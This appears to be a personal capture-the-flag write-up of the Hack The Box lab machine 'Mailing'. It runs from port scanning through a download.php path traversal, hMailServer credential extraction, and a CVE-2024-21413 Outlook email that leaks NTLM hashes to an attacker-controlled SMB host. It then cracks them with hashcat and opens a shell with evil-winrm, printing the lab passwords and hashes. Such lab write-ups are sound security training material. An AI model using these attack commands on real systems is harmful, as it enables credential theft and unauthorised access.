# Mailing

- IP -> `10.10.11.14`


## Recon

- Nmap initial scan
```
$ s nmap -sS 10.10.11.14 # nmap 10.10.11.14 --unprivileged
[sudo] password for galahad: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-14 11:34 CEST
Nmap scan report for 10.10.11.14
Host is up (0.073s latency).
Not shown: 990 filtered tcp ports (no-response)
PORT    STATE SERVICE
25/tcp  open  smtp
80/tcp  open  http
110/tcp open  pop3
135/tcp open  msrpc
139/tcp open  netbios-ssn
143/tcp open  imap
445/tcp open  microsoft-ds
465/tcp open  smtps
587/tcp open  submission
993/tcp open  imaps
```

- Nmap version scan
```
$ nmap -sV -p25,80,110,139,143,445,446,587,993 10.10.11.14 # --unprivileged
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-14 11:36 CEST
Nmap scan report for 10.10.11.14
Host is up (0.037s latency).

PORT    STATE    SERVICE       VERSION
25/tcp  open     smtp          hMailServer smtpd
80/tcp  open     http          Microsoft IIS httpd 10.0
110/tcp open     pop3          hMailServer pop3d
139/tcp open     netbios-ssn   Microsoft Windows netbios-ssn
143/tcp open     imap          hMailServer imapd
445/tcp open     microsoft-ds?
446/tcp filtered ddm-rdb
587/tcp open     smtp          hMailServer smtpd
993/tcp open     ssl/imap      hMailServer imapd
Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.78 seconds
```

- Nmap scripts scann
```
$ nmap -sV -sC 10.10.11.14
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-14 11:51 CEST
Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 16.50% done; ETC: 11:51 (0:00:10 remaining)
Nmap scan report for mailing.htb (10.10.11.14)
Host is up (0.052s latency).
Not shown: 990 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
25/tcp  open  smtp          hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp  open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Mailing
110/tcp open  pop3          hMailServer pop3d
|_pop3-capabilities: TOP UIDL USER
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp open  imap          hMailServer imapd
|_imap-capabilities: OK SORT NAMESPACE IDLE QUOTA completed CAPABILITY RIGHTS=texkA0001 CHILDREN IMAP4 IMAP4rev1 ACL
445/tcp open  microsoft-ds?
465/tcp open  ssl/smtp      hMailServer smtpd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
587/tcp open  smtp          hMailServer smtpd
|_ssl-date: TLS randomness does not represent time
| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
993/tcp open  ssl/imap      hMailServer imapd
|_imap-capabilities: OK SORT NAMESPACE IDLE QUOTA completed CAPABILITY RIGHTS=texkA0001 CHILDREN IMAP4 IMAP4rev1 ACL
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-08-14T09:51:54
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.27 seconds
```

- Nmap all ports
```
$ s nmap -sV -p- 10.10.11.14
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-20 17:02 CEST
Stats: 0:03:00 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 90.48% done; ETC: 17:05 (0:00:07 remaining)
Stats: 0:03:18 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 95.24% done; ETC: 17:05 (0:00:04 remaining)
Stats: 0:03:39 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 95.24% done; ETC: 17:05 (0:00:05 remaining)
Stats: 0:03:52 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 95.24% done; ETC: 17:06 (0:00:06 remaining)
Nmap scan report for mailing.htb (10.10.11.14)
Host is up (0.039s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
25/tcp    open  smtp          hMailServer smtpd
80/tcp    open  http          Microsoft IIS httpd 10.0
110/tcp   open  pop3          hMailServer pop3d
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp   open  imap          hMailServer imapd
445/tcp   open  microsoft-ds?
465/tcp   open  ssl/smtp      hMailServer smtpd
587/tcp   open  smtp          hMailServer smtpd
993/tcp   open  ssl/imap      hMailServer imapd
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
7680/tcp  open  pando-pub?
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
52435/tcp open  msrpc         Microsoft Windows RPC
59885/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Web recon

- There isnt much but a pdf with instructions on how to connect hMailServer, in the pdf there is an image with the email `user@mailing.htb` and a password of 8 characters

- Subdomain scan NOTHING
```
$ ffuf -w ~/Documents/tools/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -u http://mailing.htb -H 'Host: FUZZ.mailing.htb' -fw 1535

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://mailing.htb
 :: Wordlist         : FUZZ: /home/galahad/Documents/tools/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.mailing.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 1535
________________________________________________

:: Progress: [19966/19966] :: Job [1/1] :: 201 req/sec :: Duration: [0:01:35] :: Errors: 0 ::
```

- Subfiles scan
```
$ ffuf -w ../../Documents/htb/directory-list-2.3-medium.txt -u http://mailing.htb/FUZZ -ic -e .php

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://mailing.htb/FUZZ
 :: Wordlist         : FUZZ: C:\Users\user\Documents\htb\directory-list-2.3-medium.txt
 :: Extensions       : .php
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

download.php            [Status: 200, Size: 31, Words: 5, Lines: 1, Duration: 65ms]: 0 ::
index.php               [Status: 200, Size: 4681, Words: 1535, Lines: 133, Duration: 65ms]
                        [Status: 200, Size: 4681, Words: 1535, Lines: 133, Duration: 66ms]
assets                  [Status: 301, Size: 160, Words: 9, Lines: 2, Duration: 44ms]: 0 ::
Index.php               [Status: 200, Size: 4681, Words: 1535, Lines: 133, Duration: 46ms] ::
Download.php            [Status: 200, Size: 31, Words: 5, Lines: 1, Duration: 46ms]rors: 0 ::
Assets                  [Status: 301, Size: 160, Words: 9, Lines: 2, Duration: 47ms]ors: 0 ::
INDEX.php               [Status: 200, Size: 4681, Words: 1535, Lines: 133, Duration: 46ms]0 ::
instructions            [Status: 301, Size: 166, Words: 9, Lines: 2, Duration: 46ms]rors: 0 ::
DOWNLOAD.php            [Status: 200, Size: 31, Words: 5, Lines: 1, Duration: 48ms]rrors: 0 ::
                        [Status: 200, Size: 4681, Words: 1535, Lines: 133, Duration: 151ms] ::
:: Progress: [441092/441092] :: Job [1/1] :: 1176 req/sec :: Duration: [0:10:31] :: Errors: 342712 ::
```

- There is a `download.php?file=instructions.pdf` to download the pdf

- Checking for path traversal it turns out to be vulnerable
```php
// Response to -> http://mailing.htb/download.php?file=../download.php

<?php
if (isset($_GET['file'])) {
    $file = $_GET['file'];

    $file_path = 'C:/wwwroot/instructions/' . $file;
    if (file_exists($file_path)) {
        
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file_path).'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file_path));
        echo(file_get_contents($file_path));
        exit;
    } else {
        echo "File not found.";
    }
} else {
    echo "No file specified for download.";
}
?>
```

## Explotation

- Using the path traversal vuln and the info that the hMailServer is running we can get the hMailServer configuration file `hMailServer.ini` by going to `http://mailing.htb/download.php?file=../../Program+Files+(x86)/hMailServer/Bin/hMailServer.ini`
```toml
[Directories]
ProgramFolder=C:\Program Files (x86)\hMailServer
DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
DataFolder=C:\Program Files (x86)\hMailServer\Data
LogFolder=C:\Program Files (x86)\hMailServer\Logs
TempFolder=C:\Program Files (x86)\hMailServer\Temp
EventFolder=C:\Program Files (x86)\hMailServer\Events
[GUILanguages]
ValidLanguages=english,swedish
[Security]
AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7
[Database]
Type=MSSQLCE
Username=
Password=0a9f8ad8bf896b501dde74f08efd7e4c
PasswordEncryption=1
Port=0
Server=
Database=hMailServer
Internal=1
```

- There seems to have two hashes one for the admin of hMailServer and the other for the database:
```
admin -> 841bb5acfa6779ae432fd7a4e6600ba7 -> homenetworkingadministrator
database -> 0a9f8ad8bf896b501dde74f08efd7e4c -> 6FC6F69152AD
```

- With the password you can set up an account in thunderbir (or any mail client) and log in as admin `administrator@mailing.htb:homenetworkingadministrator` sadly there isnt anything inside

- Looking thorough we found a git repo with a tool to decypher the database passwd that is encrypted using the blowfish algo
```
htb/machines/mailing 
$ git clone https://github.com/GitMirar/hMailDatabasePasswordDecrypter.git
Cloning into 'hMailDatabasePasswordDecrypter'...
remote: Enumerating objects: 8, done.
remote: Total 8 (delta 0), reused 0 (delta 0), pack-reused 8 (from 1)
Receiving objects: 100% (8/8), 9.53 KiB | 4.76 MiB/s, done.
htb/machines/mailing 
$ cd hMailDatabasePasswordDecrypter/
hMailDatabasePasswordDecrypter on  master via C v13.2.0-gcc 
$ ls
blowfish.cpp  blowfish.h  blowfish.h2  main.cpp  Makefile  README.md
hMailDatabasePasswordDecrypter on  master via C v13.2.0-gcc 
$ make
g++ blowfish.cpp main.cpp -o decrypt
hMailDatabasePasswordDecrypter on  master [?] via C v13.2.0-gcc 
$ ls
blowfish.cpp  blowfish.h  blowfish.h2  decrypt  main.cpp  Makefile  README.md
hMailDatabasePasswordDecrypter on  master [?] via C v13.2.0-gcc 
$ ./decrypt 
Please provide the encrypted database password
hMailDatabasePasswordDecrypter on  master [?] via C v13.2.0-gcc 
$ ./decrypt 0a9f8ad8bf896b501dde74f08efd7e4c
6FC6F69152AD
```
- The passwd looks to be `6FC6F69152AD`

- Once we know the db file location (C:\Program Files (x86)\hMailServer\Database) and it's name (hMailServer), tried to download the file using:
    - http://mailing.htb/download.php?file=../../Program+Files+(x86)/hMailServer/Database/hMailServer not knowing the file type we tried .sql and .db with no effect, until we found that hMailServer has its dbs in .sdf type
    - So we managed to dwonload the db using: http://mailing.htb/download.php?file=../../Program+Files+(x86)/hMailServer/Database/hMailServer.sdf

- Found (CVE-2024-21413)[https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability]. Can be run against port $587$:
```
CVE-2024-21413 on  main via 🐍 v3.12.3 
$ python CVE-2024-21413.py --server 10.10.11.14 --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --url "\\10.10.14.92\test\meeting" --subject "holap
erola" --sender administrator@mailing.htb --recipient maya@mailing.htb

CVE-2024-21413 | Microsoft Outlook Remote Code Execution Vulnerability PoC.
Alexander Hagenah / @xaitax / ah@primepage.de

✅ Email sent successfully.
```
- Tested on emails found in `instructions.pdf` (`user@mailing.htb` and `maya@mailing.htb`) only maya worked.
- Starting a responder session on another shell listening on the vpn interface returned the following:
```
$ s ./Responder.py -I tun0 -v
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.4.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

...

[+] Listening for events...

[!] Error starting TCP server on port 53, check permissions or other servers running.

[SMB] NTLMv2-SSP Client   : 10.10.11.14
[SMB] NTLMv2-SSP Username : MAILING\maya
[SMB] NTLMv2-SSP Hash     : maya::MAILING:3e129f6c88bfe5d2:C52D1BF3A780BDEFE05A13CF023BC3EF:01010000000000000025641B1DF3DA01FF3199424F55E17200000000020008005300440053004C0001001E00570049004E002D00550055004C0048004500580059004A0031003400380004003400570049004E002D00550055004C0048004500580059004A003100340038002E005300440053004C002E004C004F00430041004C00030014005300440053004C002E004C004F00430041004C00050014005300440053004C002E004C004F00430041004C00070008000025641B1DF3DA0106000400020000000800300030000000000000000000000000200000580AA33257C589CAF7A6BA74228623457917656CB52845FBB87E9B404D08DE7D0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00390032000000000000000000
```
- Seems we have a hash for maya user
- Running the hash through hashcat we get:
```
htb/machines/mailing 
$ hashcat -m 5600  -a 0 hash.txt /home/galahad/Documents/tools/SecLists/Passwords/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-haswell-AMD Ryzen 7 5800HS with Radeon Graphics, 6636/13337 MB (2048 MB allocatable), 16MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Dictionary cache hit:
* Filename..: /home/galahad/Documents/tools/SecLists/Passwords/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

MAYA::MAILING:3e129f6c88bfe5d2:c52d1bf3a780bdefe05a13cf023bc3ef:01010000000000000025641b1df3da01ff3199424f55e17200000000020008005300440053004c0001001e00570049004e002d00550055004c0048004500580059004a0031003400380004003400570049004e002d00550055004c0048004500580059004a003100340038002e005300440053004c002e004c004f00430041004c00030014005300440053004c002e004c004f00430041004c00050014005300440053004c002e004c004f00430041004c00070008000025641b1df3da0106000400020000000800300030000000000000000000000000200000580aa33257c589caf7a6ba74228623457917656cb52845fbb87e9b404d08de7d0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00390032000000000000000000:m4y4ngs4ri
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: MAYA::MAILING:3e129f6c88bfe5d2:c52d1bf3a780bdefe05a...000000
Time.Started.....: Tue Aug 20 16:58:30 2024 (2 secs)
Time.Estimated...: Tue Aug 20 16:58:32 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/home/galahad/Documents/tools/SecLists/Passwords/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2870.6 kH/s (3.66ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 5947392/14344384 (41.46%)
Rejected.........: 0/5947392 (0.00%)
Restore.Point....: 5931008/14344384 (41.35%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: m6159 -> m0123m
Hardware.Mon.#1..: Temp: 45c Util: 66%

Started: Tue Aug 20 16:58:28 2024
Stopped: Tue Aug 20 16:58:34 2024
```
- The password for the user maya seems to be `m4y4ngs4ri`
- Seeing port 5895 is open we can use (evil-winrm)[https://github.com/Hackplayers/evil-winrm] to pop a shell into the system:
```
$ evil-winrm -i 10.10.11.14 -u maya -p m4y4ngs4ri
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\maya\Documents>
```
- Going to the desktop we can get the user flag:
```
*Evil-WinRM* PS C:\Users\maya\Desktop> cat user.txt
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

- We can go to the `localadmin` desktop and cat the flag directly(?) weird:
```
*Evil-WinRM* PS C:\Users\localadmin\Desktop> cat root.txt
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```
